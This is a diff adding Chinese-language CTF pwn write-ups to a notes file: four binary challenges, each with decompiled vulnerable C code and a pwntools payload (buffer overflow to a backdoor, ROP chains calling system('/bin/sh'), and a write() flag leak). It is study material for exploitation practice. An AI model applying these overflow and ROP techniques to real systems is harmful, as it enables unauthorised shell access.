@@ -1,3 +1,83 @@
+## bjdctf_2020_babystack
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
+  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF
+  //...
+  __isoc99_scanf("%d", &nbytes);
+  puts("[+]What's u name?");
+  read(0, buf, (unsigned int)nbytes);
+  return 0;
+}
+```
+
+简单`gets()`缓冲区溢出，并且有`backdoor()`函数（0x4006e6）调用`system("/bin/sh")`
+
+`io.sendlines([b'10086', b'a'*0x18 + p64(0x4006e6)])`
+
+## not_the_same_3dsctf_2016
+
+比[bjdctf_2020_babystack](#bjdctf_2020_babystack)稍微复杂一点的简单题，
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF
+
+  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");
+  gets(v4);
+  return 0;
+}
+
+int get_secret()
+{
+  int v0; // esi
+
+  v0 = fopen("flag.txt", &unk_80CF91B);
+  fgets(&fl4g, 45, v0);
+  return fclose(v0);
+}
+```
+
+通过String view找到`flag`然后跳转引用到`get_secret()`函数（0x80489a0），此函数将flag内容输出到`&fl4g`（0x80eca2d），所以需要用一个输出函数打印它（一般用`write()`，因为它打印的结束条件只有长度这一参数）；Functions window中搜索有`write()`（0x806e270）
+
+注意这里的`main()`函数开头是没有`push ebp`的，故不需要覆盖ebp
+
+故payload = get_secret（溢出返回） + write（get_secret返回） + 任意（无所谓返回）+ 0 + 1（stdout） + &fl4g + 45（`write(stdout, &fl4g, 45)`）
+
+```python
+payload = b'a'*0x2d + p32(0x80489a0) + p32(0x806e270) + p32(0) + p32(1) + p32(0x80eca2d) + p32(45)
+```
+
+## [HarekazeCTF2019]baby_rop
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[16]; // [rsp+0h] [rbp-10h] BYREF
+
+  system("echo -n \"What's your name? \"");
+  __isoc99_scanf("%s", v4);
+  printf("Welcome to the Pwn World, %s!\n", v4);
+  return 0;
+}
+```
+
+简单64位栈溢出；`system()`函数（0x400490）和`"/bin/sh"`（0x601048）都有，注意 64位程序使用寄存器传参，所以需要把栈上参数弹到寄存器上，然后再调用目标函数，也就是`pop rdi; ret`；这条指令据说是有万能地址的（normal/#ciscn_2019_c_1 中是0x400c83，而本题是0x400683，或者使用`next(elf_file.search(asm('pop rdi\nret')))`）
+
+payload = b'a'*0x18 + p64(0x400683) + p64(0x601048) + p64(0x400490)
+
+## jarvisoj_level2_x64
+
+和[\[HarekazeCTF2019\]baby_rop](#[HarekazeCTF2019]baby_rop)没有多大区别，不赘述
+
+```python
+pop_rip_ret = next(elf_file.search(asm('pop rdi\nret')))
+payload = b'a'*0x88 + p64(pop_rip_ret) + p64(0x600a90) + p64(elf.plt['system'])
+```
+
 ## warmup_csaw_2016
 
 危险函数`gets`，缓冲区距离栈顶`0x40`字节
